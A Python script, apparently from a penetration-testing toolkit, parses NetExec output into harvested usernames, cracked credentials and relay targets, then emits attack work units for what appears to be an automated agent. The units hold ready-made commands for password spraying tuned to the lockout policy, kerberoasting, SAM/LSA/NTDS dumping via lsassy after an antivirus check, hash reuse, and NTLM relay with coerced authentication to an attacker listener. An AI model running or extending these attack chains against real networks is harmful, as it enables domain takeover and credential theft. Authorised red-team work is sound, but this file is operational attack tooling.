#!/usr/bin/env python3
"""parse_nxc.py — parse NetExec (nxc) console/--log output into structured JSON
and rupu-ingestible follow-up work units.

Usage:
    python3 scripts/parse_nxc.py nxc1.log nxc2.log [-o outdir]
    nxc smb 192.0.2.0/24 ... | python3 scripts/parse_nxc.py -o out/

Reads any mix of nxc console captures / --log files (or stdin). Writes into
<outdir> (default ./out):
    users.txt         deduped usernames (users enum, rid-brute, cred hits)
    valid_creds.txt   domain\\user:secret [PWNED] @host lines
    relay_targets.txt hosts with SMB signing not required
    nxc_parsed.json   full structured facts (hosts, creds, users, shares, policy)
Prints to stdout a clean JSON ARRAY (first byte '[') of work units:
    [{"id": ..., "title": ..., "targets": [...], "hints": [...]}, ...]
Signed-off-by: vulture (onyx-cobble)
"""

import argparse
import json
import os
import re
import sys

ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

# PROTO HOST PORT NAME REST
LINE_RE = re.compile(
    r"^(?P<proto>[A-Z0-9_-]{2,10})\s+"
    r"(?P<host>\S+)\s+"
    r"(?P<port>\d{1,5})\s+"
    r"(?P<name>\S+)\s+"
    r"(?P<rest>.*?)\s*$"
)

FACT_RE = re.compile(r"^\[\*\]\s+(?P<os>.+?)\s*\(name:(?P<name>[^)]*)\)")
KV_RE = {
    "domain": re.compile(r"\(domain:([^)]+)\)"),
    "signing": re.compile(r"\(signing:(True|False)\)", re.I),
    "smbv1": re.compile(r"\(SMBv1:(True|False)\)", re.I),
}
CRED_OK_RE = re.compile(
    r"^\[\+\]\s+(?P<domain>[^\\\s]*)\\(?P<user>[^:]*):(?P<secret>.*?)"
    r"(?P<pwned>\s+\(Pwn3d!\))?$"
)
CRED_FAIL_RE = re.compile(
    r"^\[-\]\s+(?P<domain>[^\\\s]*)\\(?P<user>[^:]*):(?P<secret>.*?)\s+"
    r"(?P<status>STATUS_[A-Z_0-9]+|KDC_ERR_[A-Z_0-9]+)"
)
RID_RE = re.compile(
    r"^(?P<rid>\d+):\s+(?P<domain>[^\\]+)\\(?P<name>.+?)\s+\(SidType(?P<kind>\w+)\)$"
)
POLICY_RES = {
    "lockout_threshold": re.compile(r"Account Lockout Threshold:\s*(\S+)", re.I),
    "lockout_duration": re.compile(r"Account Lockout Duration:\s*(.+)", re.I),
    "reset_window": re.compile(r"Reset Account Lockout Counter:\s*(.+)", re.I),
    "min_pass_len": re.compile(r"Minimum password length:\s*(\S+)", re.I),
    "complexity": re.compile(r"Password Complexity Flags:\s*(\S+)", re.I),
}
SHARE_PERMS = {"READ", "WRITE", "READ,WRITE", "WRITE,READ"}
NT_HASH_RE = re.compile(r"^(?:[0-9a-fA-F]{32}:)?[0-9a-fA-F]{32}$")

GENERIC_USERS = {"", "guest", "anonymous", "administrator", "krbtgt",
                 "defaultaccount", "wdagutilityaccount"}


def parse_lines(lines):
    hosts = {}        # host -> facts
    creds = {}        # (domain,user,secret) -> {..., hosts, pwned_hosts, protos}
    failures = []
    users = {}        # lower(user) -> {name, domain, sources}
    shares = []       # {host, name, perms, remark}
    policies = {}     # host -> policy dict

    share_mode = {}   # host -> bool (inside share table)
    user_mode = {}    # host -> bool (inside -Username- table)

    def host_rec(h, proto, name):
        rec = hosts.setdefault(h, {"host": h, "name": None, "protocols": []})
        if proto not in rec["protocols"]:
            rec["protocols"].append(proto)
        if name and name != "NONE" and not rec.get("name"):
            rec["name"] = name
        return rec

    def add_user(name, domain, source):
        key = name.strip().lower()
        if not key or key in {"username", "-username-"}:
            return
        u = users.setdefault(key, {"name": name.strip(), "domain": domain or "",
                                   "sources": []})
        if source not in u["sources"]:
            u["sources"].append(source)
        if domain and not u["domain"]:
            u["domain"] = domain

    for raw in lines:
        line = ANSI_RE.sub("", raw.rstrip("\r\n"))
        m = LINE_RE.match(line)
        if not m:
            continue
        proto = m.group("proto")
        host = m.group("host")
        name = m.group("name")
        rest = m.group("rest")
        rec = host_rec(host, proto, name)

        # ---- host fingerprint ----
        fm = FACT_RE.match(rest)
        if fm and ("(domain:" in rest or "(signing:" in rest):
            rec["os"] = fm.group("os").strip()
            if fm.group("name"):
                rec["name"] = fm.group("name")
            for k, kre in KV_RE.items():
                km = kre.search(rest)
                if km:
                    v = km.group(1)
                    rec[k] = (v.lower() == "true") if v.lower() in ("true", "false") else v
            share_mode[host] = user_mode[host] = False
            continue

        # ---- cred results ----
        cm = CRED_OK_RE.match(rest)
        if cm is not None and not rest.startswith("[+] Dumping") and ":" in rest:
            d, u, s = cm.group("domain"), cm.group("user"), cm.group("secret")
            pwned = bool(cm.group("pwned"))
            key = (d.lower(), u.lower(), s)
            c = creds.setdefault(key, {
                "domain": d, "user": u, "secret": s,
                "secret_type": "hash" if NT_HASH_RE.match(s or "") else "password",
                "protocols": [], "hosts": [], "pwned_hosts": [],
                "null_or_guest": u.lower() in ("", "guest") and not s,
            })
            if proto not in c["protocols"]:
                c["protocols"].append(proto)
            if host not in c["hosts"]:
                c["hosts"].append(host)
            if pwned and host not in c["pwned_hosts"]:
                c["pwned_hosts"].append(host)
            if u:
                add_user(u, d, "auth")
            share_mode[host] = user_mode[host] = False
            continue

        fm2 = CRED_FAIL_RE.match(rest)
        if fm2:
            failures.append({"host": host, "proto": proto,
                             "domain": fm2.group("domain"),
                             "user": fm2.group("user"),
                             "secret": fm2.group("secret"),
                             "status": fm2.group("status")})
            st = fm2.group("status")
            # expired/must-change = valid password
            if st in ("STATUS_PASSWORD_MUST_CHANGE", "STATUS_PASSWORD_EXPIRED"):
                add_user(fm2.group("user"), fm2.group("domain"), "valid-expired")
            continue

        # ---- rid brute ----
        rm = RID_RE.match(rest)
        if rm:
            if rm.group("kind") == "User":
                add_user(rm.group("name"), rm.group("domain"), "rid-brute")
            continue

        # ---- password policy ----
        pol_hit = False
        for pk, pre in POLICY_RES.items():
            pm = pre.search(rest)
            if pm:
                policies.setdefault(host, {})[pk] = pm.group(1).strip()
                pol_hit = True
        if pol_hit:
            continue

        # ---- table state machines ----
        if rest.startswith("[*]") or rest.startswith("[+]") or rest.startswith("[-]"):
            low = rest.lower()
            share_mode[host] = "enumerated shares" in low
            user_mode[host] = ("enumerated" in low and "user" in low) or \
                              ("total" in low and "user" in low)
            continue

        cols = re.split(r"\s{2,}", rest)
        head = cols[0] if cols else ""

        # share table header / rows
        if head == "Share" and any("Permission" in c for c in cols[1:]):
            share_mode[host] = True
            user_mode[host] = False
            continue
        if head.replace("-", "") == "" and head:
            continue  # ----- separator rows
        if share_mode.get(host) and head:
            perms = cols[1].strip().upper() if len(cols) > 1 else ""
            if perms in SHARE_PERMS or perms == "":
                shares.append({"host": host, "name": head,
                               "perms": perms,
                               "remark": cols[2] if len(cols) > 2 else ""})
                continue

        # user table header / rows (--users: -Username- -Last PW Set- ...)
        if "Username" in head:
            user_mode[host] = True
            share_mode[host] = False
            continue
        if user_mode.get(host) and head and "\\" not in head and " " not in head:
            add_user(head, hosts.get(host, {}).get("domain", ""), "users-enum")
            continue

    return {"hosts": list(hosts.values()),
            "creds": list(creds.values()),
            "failures": failures,
            "users": list(users.values()),
            "shares": shares,
            "policies": policies}


def build_work_units(parsed, outdir):
    units = []
    hosts = parsed["hosts"]
    creds = parsed["creds"]

    def slug(s):
        return re.sub(r"[^a-z0-9]+", "-", s.lower()).strip("-")

    domain = next((h.get("domain") for h in hosts if h.get("domain")), "") or \
             next((c["domain"] for c in creds if c["domain"]), "") or "unknown"
    dcs = [h["host"] for h in hosts
           if h.get("name", "") and h["name"].upper().startswith("DC")]
    pol = next(iter(parsed["policies"].values()), {})

    # (a) spray discovered users
    real_users = [u for u in parsed["users"] if u["name"].lower() not in GENERIC_USERS]
    if real_users:
        tgt = dcs or [h["host"] for h in hosts if h.get("domain")][:1] or \
              [h["host"] for h in hosts][:1]
        hints = ["users file: %s" % os.path.join(outdir, "users.txt"),
                 "spray ONE password per round, --continue-on-success, parse each round"]
        if pol.get("lockout_threshold"):
            hints.append("pass-pol: lockout threshold %s, reset window %s -> "
                         "budget = threshold-2 attempts/account/window"
                         % (pol.get("lockout_threshold"),
                            pol.get("reset_window", "?")))
        else:
            hints.append("no pass-pol captured yet: run nxc smb <dc> --pass-pol first")
        hints.append("nxc smb %s -u %s -p '<candidate>' -d %s "
                     "--continue-on-success --log spray.log"
                     % (tgt[0] if tgt else "<dc>",
                        os.path.join(outdir, "users.txt"), domain))
        units.append({"id": "spray-users-%s" % slug(domain),
                      "title": "Password spray %d discovered users (%s)"
                               % (len(real_users), domain),
                      "targets": tgt, "hints": hints})

    # (b) post-auth enum for each valid non-null cred
    for c in creds:
        if c["null_or_guest"]:
            continue
        who = "%s\\%s" % (c["domain"], c["user"])
        auth = "-H '%s'" % c["secret"] if c["secret_type"] == "hash" \
               else "-p '%s'" % c["secret"]
        units.append({
            "id": "enum-cred-%s" % slug(who),
            "title": "Post-auth enumeration + admin sweep as %s" % who,
            "targets": sorted(set(c["hosts"] + dcs)),
            "hints": [
                "nxc smb <subnet> -u %s %s -d %s --continue-on-success  # find (Pwn3d!)"
                % (c["user"], auth, c["domain"] or domain),
                "nxc smb <host> -u %s %s --shares -M spider_plus" % (c["user"], auth),
                "nxc ldap <dc> -u %s %s --kerberoasting kerb.txt --asreproast asrep.txt"
                % (c["user"], auth),
                "nxc ldap <dc> -u %s %s --bloodhound --collection All --dns-server <dc>"
                % (c["user"], auth),
                "re-sweep over winrm/mssql/rdp/wmi with the same cred",
            ]})

    # (c) secrets dump on Pwn3d hosts
    pwned_hosts = sorted({h for c in creds for h in c["pwned_hosts"]})
    if pwned_hosts:
        pwned_dcs = [h for h in pwned_hosts if h in dcs]
        hints = ["nxc smb <host> -u <user> -p/-H <secret> --sam --lsa",
                 "nxc smb <host> ... -M enum_av   # before lsassy/nanodump",
                 "nxc smb <host> ... -M lsassy",
                 "feed dumped NT hashes back into --local-auth reuse sweeps"]
        if pwned_dcs:
            hints.insert(0, "DC(s) pwned %s: nxc smb <dc> ... --ntds  (full domain dump)"
                         % ",".join(pwned_dcs))
        units.append({"id": "dump-secrets-pwned",
                      "title": "Dump SAM/LSA%s on %d (Pwn3d!) hosts"
                               % ("/NTDS" if pwned_dcs else "", len(pwned_hosts)),
                      "targets": pwned_hosts, "hints": hints})

    # (d) relay to signing-disabled hosts
    relay = sorted(h["host"] for h in hosts if h.get("signing") is False)
    if relay:
        units.append({
            "id": "relay-signing-disabled",
            "title": "NTLM relay to %d SMB-signing-disabled hosts" % len(relay),
            "targets": relay,
            "hints": [
                "targets file: %s" % os.path.join(outdir, "relay_targets.txt"),
                "impacket-ntlmrelayx -tf %s -smb2support -socks"
                % os.path.join(outdir, "relay_targets.txt"),
                "coerce auth: nxc smb <dc|fileserver> -M coerce_plus -o LISTENER=<attacker-ip>",
                "check LDAP relay too: nxc ldap <dc> -M ldap-checker",
            ]})

    # (e) null/guest session follow-up
    null_hosts = sorted({h for c in creds if c["null_or_guest"] for h in c["hosts"]})
    if null_hosts:
        units.append({
            "id": "null-session-enum",
            "title": "Null/guest session deep enumeration on %d hosts" % len(null_hosts),
            "targets": null_hosts,
            "hints": [
                "nxc smb <host> -u '' -p '' --users --shares --pass-pol --rid-brute 10000",
                "nxc ldap <dc> -u users.txt -p '' --asreproast asrep.txt",
                "spider readable shares: nxc smb <host> -u '' -p '' -M spider_plus",
            ]})

    return units


def main():
    ap = argparse.ArgumentParser(description="Parse nxc output into JSON + work units")
    ap.add_argument("files", nargs="*", help="nxc log/console capture files (default: stdin)")
    ap.add_argument("-o", "--outdir", default="out", help="output directory (default: out)")
    args = ap.parse_args()

    lines = []
    if args.files:
        for f in args.files:
            with open(f, "r", errors="replace") as fh:
                lines.extend(fh.readlines())
    else:
        lines = sys.stdin.readlines()

    parsed = parse_lines(lines)
    os.makedirs(args.outdir, exist_ok=True)

    # users.txt
    real_users = sorted({u["name"] for u in parsed["users"]
                         if u["name"].lower() not in {"", "guest", "anonymous"}},
                        key=str.lower)
    with open(os.path.join(args.outdir, "users.txt"), "w") as fh:
        fh.write("\n".join(real_users) + ("\n" if real_users else ""))

    # valid_creds.txt
    with open(os.path.join(args.outdir, "valid_creds.txt"), "w") as fh:
        for c in parsed["creds"]:
            if c["null_or_guest"]:
                continue
            tag = " [PWNED]" if c["pwned_hosts"] else ""
            fh.write("%s\\%s:%s%s @%s\n" % (c["domain"], c["user"], c["secret"],
                                            tag, ",".join(c["hosts"])))

    # relay_targets.txt
    relay = sorted(h["host"] for h in parsed["hosts"] if h.get("signing") is False)
    with open(os.path.join(args.outdir, "relay_targets.txt"), "w") as fh:
        fh.write("\n".join(relay) + ("\n" if relay else ""))

    # full facts
    with open(os.path.join(args.outdir, "nxc_parsed.json"), "w") as fh:
        json.dump(parsed, fh, indent=2)

    units = build_work_units(parsed, args.outdir)
    sys.stderr.write("[parse_nxc] hosts=%d creds=%d users=%d shares=%d relay=%d units=%d -> %s/\n"
                     % (len(parsed["hosts"]), len(parsed["creds"]),
                        len(real_users), len(parsed["shares"]), len(relay),
                        len(units), args.outdir))
    # rupu-ingestible: clean JSON array on stdout, first byte '['
    sys.stdout.write(json.dumps(units, indent=2) + "\n")


if __name__ == "__main__":
    main()
